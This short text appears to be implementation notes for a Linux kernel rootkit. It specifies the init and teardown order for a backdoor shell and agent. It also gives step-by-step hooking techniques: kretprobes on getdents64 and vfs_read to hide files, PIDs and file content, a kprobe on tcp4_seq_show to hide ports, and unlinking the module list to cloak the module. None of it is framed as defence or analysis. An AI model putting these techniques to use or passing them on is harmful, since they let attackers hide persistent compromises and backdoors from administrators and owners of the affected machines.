Init order matters: parse key first, init target lists, then shell, then agent
(needs shell), then probes, then proc.
Exit reverses this: uncloak first so rmmod works, remove proc, unregister
probes, stop agent, stop shell.

For directory hiding: kretprobe on __x64_sys_getdents64.
Entry handler captures dirp (arg 1).
Return handler: copy_from_user_nofault, walk dirent records (d_reclen at offset
16, d_name at offset 19), check rk_target_prefix_match for files and
rk_target_number_match for PIDs, memmove to compact, copy_to_user_nofault and
regs_set_return_value.

For content hiding: kretprobe on vfs_read.
Return handler: copy buffer, walk line by line with memchr for newlines, check
rk_target_substring_match, compact with memmove.

For port hiding: kprobe pre-handler on tcp4_seq_show.
Get v from regs->si.
If v == SEQ_START_TOKEN return 0.
Otherwise cast to sock*, get inet_sk(sk)->inet_sport, check
rk_target_number_match.
Return 1 to skip.

For cloaking: list_del(&THIS_MODULE->list) to hide, list_add(&THIS_MODULE->list,
saved_prev) to restore.
Save prev before deleting.
